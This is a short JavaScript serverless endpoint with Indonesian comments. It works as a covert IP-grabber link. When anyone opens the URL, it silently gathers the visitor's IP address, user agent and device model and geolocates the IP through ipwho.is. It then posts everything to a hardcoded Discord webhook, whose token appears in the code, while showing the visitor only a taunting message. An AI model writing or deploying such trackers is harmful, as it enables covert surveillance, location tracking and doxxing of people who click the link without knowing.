// File: api/apapun.js

export default async function handler(req, res) {
  const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1452653310443257970/SkdnTLTdZUq5hJUf7POXHYcILxlYIVTS7TVc-NYKruBSlotTJtA2BzHY9bEACJxrlnd5';
  
  // Ambil IP dari Vercel
  const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() 
    || req.socket.remoteAddress 
    || 'unknown';
  
  const userAgentRaw = req.headers['user-agent'] || 'unknown';
  
  // === TANPA LIST - AMBIL LANGSUNG DARI USER AGENT ===
  // Device Type: deteksi sederhana tanpa list
  let deviceType = 'Desktop';
  const uaLower = userAgentRaw.toLowerCase();
  if (uaLower.includes('mobile')) deviceType = 'Mobile';
  if (uaLower.includes('tablet') || uaLower.includes('ipad')) deviceType = 'Tablet';
  
  // Device Model: EKSTRAK LANGSUNG dari User Agent (tanpa list mapping)
  // Ini akan mengambil kode/angka/model apapun yang ada di user agent
  let deviceModel = 'Unknown';
  
  // Cari pola umum model device di user agent
  // Pola 1: Huruf besar + angka + huruf besar/angka (contoh: SM-G998B, iPhone14,2)
  const modelPattern1 = userAgentRaw.match(/[A-Z]{2,}-?[A-Z0-9]+[0-9][A-Z0-9]*/i);
  if (modelPattern1) deviceModel = modelPattern1[0];
  
  // Pola 2: Angka 8-10 digit (contoh: 21091116AC untuk Redmi)
  const modelPattern2 = userAgentRaw.match(/[0-9]{8,}[A-Z]{0,2}/i);
  if (deviceModel === 'Unknown' && modelPattern2) deviceModel = modelPattern2[0];
  
  // Pola 3: Setelah kata "Android" sampai sebelum tanda kurung/titik koma
  const androidMatch = userAgentRaw.match(/Android\s+[0-9.]+;\s+([^;)]+)/);
  if (deviceModel === 'Unknown' && androidMatch) deviceModel = androidMatch[1].trim();
  
  // === Ambil info lengkap dari ipwho.is ===
  let ipwhoisData = null;
  try {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 3000);
    const response = await fetch(`https://ipwho.is/${ip}`, { signal: controller.signal });
    clearTimeout(timeoutId);
    if (response.ok) ipwhoisData = await response.json();
  } catch (err) {
    console.error('GeoIP error:', err.message);
  }
  
  // === KIRIM KE DISCORD (SEMUA INFO ASLI) ===
  let discordContent = `**🔔 ADA YANG BUKA LINK!**\n\n` +
    `**🌐 IP:** \`${ip}\`\n` +
    `**📱 Device Type:** ${deviceType}\n` +
    `**📲 Device Model (Asli):** \`${deviceModel}\`\n` +
    `**🕒 Waktu:** ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}\n\n`;
  
  // Kirim USER AGENT LENGKAP (sumber semua data asli)
  discordContent += `**📱 USER AGENT LENGKAP (Sumber Data Asli):**\n` +
    `\`\`\`\n${userAgentRaw}\n\`\`\`\n`;
  
  if (ipwhoisData && ipwhoisData.success) {
    discordContent += `**📍 DATA LENGKAP IPWHOIS:**\n` +
      `\`\`\`json\n${JSON.stringify(ipwhoisData, null, 2)}\n\`\`\``;
  }
  
  // Kirim ke Discord
  fetch(DISCORD_WEBHOOK, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ content: discordContent })
  }).catch(err => console.error('Discord error:', err.message));
  
  // === RESPONSE JSON ===
  res.status(200).json({
    message: "SIRI JELEK CUY"
  });
                                 }
